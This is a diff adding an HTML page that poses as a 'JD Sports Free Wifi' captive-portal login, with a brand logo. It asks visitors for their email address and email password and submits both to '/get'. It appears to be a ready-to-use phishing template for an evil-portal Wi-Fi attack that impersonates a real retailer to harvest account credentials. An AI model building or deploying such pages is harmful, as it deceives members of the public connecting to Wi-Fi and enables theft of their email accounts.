@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo {
+  text-align: center;
+  margin-bottom: 30px;
+}
+
+.form-container {
+  background: #fff;
+  border: 1px solid #ddd;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 1px solid #ccc; 
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #000000;
+  border: none;
+  color: #FFFFFF;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+}
+
+.submit-btn:hover {
+  background: #eb1c22;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo">
+    <svg xmlns="http://www.w3.org/2000/svg" height="300" width="500" viewBox="-1.158081 -1.930225 10.036702 11.58135"><path d="M5.85011 3.79169C6.0572 2.5866 4.70817 2.7637 4.70817 2.7637l-.3376 2.0514s1.27211.19896 1.47954-1.02341m.89994.0162c-.15487.93627-.907 1.86796-2.10926 1.86796H3.36585l.61878-3.74827H5.2585c1.19874 0 1.645.93663 1.49154 1.88031m-2.939-1.87219C3.18242 6.16727 1.1102 5.77956 1.1102 5.77956l.11712-.89535c1.44428.0176 1.68981-2.94851 1.68981-2.94851zm3.9095 1.92475C7.72054 1.72862 5.99192 0 3.8601 0 1.7279 0 0 1.72862 0 3.86045 0 5.99229 1.7279 7.7209 3.8601 7.7209c2.13183 0 3.86044-1.72861 3.86044-3.86045"/></svg>
+
+  </div>
+
+  <div class="form-container">
+
+      <center><h1>Sign into JD Sports Free Wifi</h1>
+                    <h2>Use your Email Account to sign in</h2></center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+      
+      <button class="submit-btn" type="submit">Continue</button>
+    
+    </form>
+
+  </div>
+
+</div>
+
+</body>
+</html>
